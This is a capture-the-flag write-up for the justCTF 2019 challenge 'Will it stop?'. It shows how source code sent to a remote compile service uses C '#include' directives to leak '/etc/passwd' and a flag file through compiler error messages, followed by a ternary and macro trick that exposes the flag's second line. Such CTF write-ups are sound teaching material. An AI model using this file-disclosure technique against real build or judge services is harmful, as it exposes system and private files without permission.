# Will it stop?

## Challenge info

Poor Vesim... Would you help him?

```  
nc will-it-stop.nc.jctf.pro 1337  
# EDITed: after CTF use:  
nc 2019.nc.jctf.pro 1342  
```

PS: The `flag` is in users home directory.

Link to pdf [mirror](https://github.com/vilkoz/ctf-
writeup/blob/master/justCTF-2019/will_it_stop/ctf.pdf)

## PDF contents

```  
Will it stop?

Memory limit:  
Time limit:

42 MiB  
1337 ms

Vesim is a CS student. This semester he is really struggling to pass
computability and formal language  
theory course. He asked for a last chance, so the professor gave him a task:
"For a given Python program, tell  
me if it will eventually stop or not!". Sadly Vesim was pwning and reversing
so he didn’t have time to solve this  
problem. Could you help him?  
The professor agreed to host the submission system on his private server.  
Funny fact: At home the professor has a wide collection of flags from all over
the world!

I NPUT  
First line of input contains number N .  
Following N lines contain Python source code.

OUTPUT  
If the given Python program stops, the output shall contain "YES", otherwise
"NO".

EXAMPLES

Input  
2  
while 1:  
pass

Output  
NO

Input  
1  
print("jctf{stop!}")

Output  
YES  
```

## Solution

At first, I've checked the endpoint:  
```  
How many lines does your C program parsing a Python code have?  
1  
Write your program now:  
int main(void) {puts("gopa");}  
Ok, let's build it!  
...  
GO LEARN MORE CS OR YOU WILL NEVER PASS IT!!11!  
```  
NOTE: At the begining of the ctf there was an linking error (e.g. `ld: error:
cannot write into /dev/null` or something like this) instead of this `GO LEARN
MORE CS..` text.

So, if our code will not be linked and executed the information disclosure
should be happen in the compilation process, also recently I heard that system
files could be partly read with `#include` directives of cpp (C preprocessor).

After it, I've tried to see usernames of the "professor's" computer, because
flag should be in users home directory:  
```  
~/g/c/will_it_stop> cat test1.txt  
1  
#include "/etc/passwd"  
~/g/c/will_it_stop> cat test1.txt | nc 2019.nc.jctf.pro 1342  
How many lines does your C program parsing a Python code have?  
Write your program now:  
Ok, let's build it!  
In file included from <stdin>:1:0:  
/etc/passwd:1:8: error: expected '=', ',', ';', 'asm' or '__attribute__'
before ':' token  
aturing:x:1000:1000::/home/aturing:/bin/sh  
       ^  
COMPILATION FAILED  
```

Seems like, username is aturing, so flag should be `/home/aturing/flag`:

```  
~/g/c/will_it_stop> cat test2.txt  
1  
#include "/home/aturing/flag"  
~/g/c/will_it_stop> cat test2.txt | nc 2019.nc.jctf.pro 1342  
How many lines does your C program parsing a Python code have?  
Write your program now:  
Ok, let's build it!  
In file included from <stdin>:1:0:  
/home/aturing/flag:1:8: error: expected '=', ',', ';', 'asm' or
'__attribute__' before ':' token  
justCTF:is_this_the_real_flag__is_this_just_fantasy__open_your_eyes_look_bellow_in_the_file_and_see  
       ^  
COMPILATION FAILED  
```

Here I've stuck for a while, becouse I needed to somehow reveal the contents
of the second line of the file,  
to do this the error on /home/aturing/flag:1 should be "fixed".

In C symbol `:` is used for ternary operator (e.g. `STATEMENT ? "IF TRUE" :
"IF FALSE"`), and for bitfields  
I've decided that it would be easier to use ternary operator and with trial
and error I've came to this:

```  
~/g/c/will_it_stop> cat test.txt  
4  
#define justCTF 1  
int
is_this_the_real_flag__is_this_just_fantasy__open_your_eyes_look_bellow_in_the_file_and_see
= 1;  
int gopa = 1 ?  
#include </home/aturing/flag>  
~/g/c/will_it_stop> cat test.txt | nc 2019.nc.jctf.pro 1342  
How many lines does your C program parsing a Python code have?  
Write your program now:  
Ok, let's build it!  
<stdin>:1:17: error: expected ',' or ';' before numeric constant  
/home/aturing/flag:2:1: note: in expansion of macro 'justCTF'  
justCTF{mama_just_got_a_flag}  
^~~~~~~  
COMPILATION FAILED  
`

Original writeup (https://github.com/vilkoz/ctf-
writeup/tree/master/justCTF-2019/will_it_stop).